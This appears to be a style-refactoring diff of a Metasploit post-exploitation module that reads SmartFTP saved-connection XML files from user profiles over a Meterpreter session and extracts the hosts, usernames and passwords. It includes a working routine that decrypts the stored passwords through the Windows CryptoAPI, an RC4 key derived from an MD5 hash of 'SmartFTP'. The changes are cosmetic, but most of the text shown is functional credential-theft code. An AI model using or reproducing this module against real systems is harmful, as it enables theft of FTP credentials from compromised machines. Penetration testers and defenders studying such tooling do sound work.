@@ -39,10 +39,10 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-    grab_user_profiles().each do |user|
+    grab_user_profiles.each do |user|
       next if user['AppData'].nil?
 
-      tmpath = user['AppData'] + "\\SmartFTP\\Client 2.0\\Favorites"
+      tmpath = user['AppData'] + '\\SmartFTP\\Client 2.0\\Favorites'
 
       enum_subdirs(tmpath).each do |xmlfile|
         xml = get_xml(xmlfile)
@@ -83,18 +83,14 @@ class MetasploitModule < Msf::Post
   # We attempt to open the discovered XML files and alert the user if
   # we cannot access the file for any reason
   def get_xml(path)
-    begin
-      connections = client.fs.file.new(path, 'r')
+    connections = client.fs.file.new(path, 'r')
 
-      condata = ''
-      until connections.eof
-        condata << connections.read
-      end
-      return condata
-    rescue Rex::Post::Meterpreter::RequestError => e
-      print_error "Received error code #{e.code} when reading #{path}"
-      return nil
-    end
+    condata = ''
+    condata << connections.read until connections.eof
+    return condata
+  rescue Rex::Post::Meterpreter::RequestError => e
+    print_error "Received error code #{e.code} when reading #{path}"
+    return nil
   end
 
   # Extracts the saved connection data from the XML. If no password
@@ -102,7 +98,7 @@ class MetasploitModule < Msf::Post
   # back to the database
   def parse_xml(data)
     mxml = REXML::Document.new(data).root
-    mxml.elements.to_a("//FavoriteItem").each do |node|
+    mxml.elements.to_a('//FavoriteItem').each do |node|
       next if node.elements['Host'].nil?
       next if node.elements['User'].nil?
       next if node.elements['Password'].nil?
@@ -133,7 +129,7 @@ class MetasploitModule < Msf::Post
       credential_data = {
         origin_type: :session,
         session_id: session_db_id,
-        post_reference_name: self.refname,
+        post_reference_name: refname,
         private_type: :password,
         private_data: pass,
         username: user
@@ -154,8 +150,8 @@ class MetasploitModule < Msf::Post
 
   # Hooks the Windows CryptoAPI libraries to decrypt the Passwords
   def decrypt(password)
-    cipher = [password].pack("H*")
-    ms_enhanced_prov = "Microsoft Enhanced Cryptographic Provider v1.0"
+    cipher = [password].pack('H*')
+    ms_enhanced_prov = 'Microsoft Enhanced Cryptographic Provider v1.0'
     prov_rsa_full = 1
     crypt_verify_context = 0xF0000000
     alg_md5 = 32771
@@ -165,7 +161,7 @@ class MetasploitModule < Msf::Post
 
     acquirecontext = advapi32.CryptAcquireContextW(4, nil, ms_enhanced_prov, prov_rsa_full, crypt_verify_context)
     createhash = advapi32.CryptCreateHash(acquirecontext['phProv'], alg_md5, 0, 0, 4)
-    hashdata = advapi32.CryptHashData(createhash['phHash'], "SmartFTP", 16, 0)
+    hashdata = advapi32.CryptHashData(createhash['phHash'], 'SmartFTP', 16, 0)
     derivekey = advapi32.CryptDeriveKey(acquirecontext['phProv'], alg_rc4, createhash['phHash'], 0x00800000, 4)
     decrypted = advapi32.CryptDecrypt(derivekey['phKey'], 0, true, 0, cipher, cipher.length)
     destroyhash = advapi32.CryptDestroyHash(createhash['phHash'])
@@ -173,7 +169,7 @@ class MetasploitModule < Msf::Post
     releasecontext = advapi32.CryptReleaseContext(acquirecontext['phProv'], 0)
 
     data = decrypted['pbData']
-    data.gsub!(/[\x00]/, '')
+    data.gsub!(/\x00/, '')
     return data
   end
 end
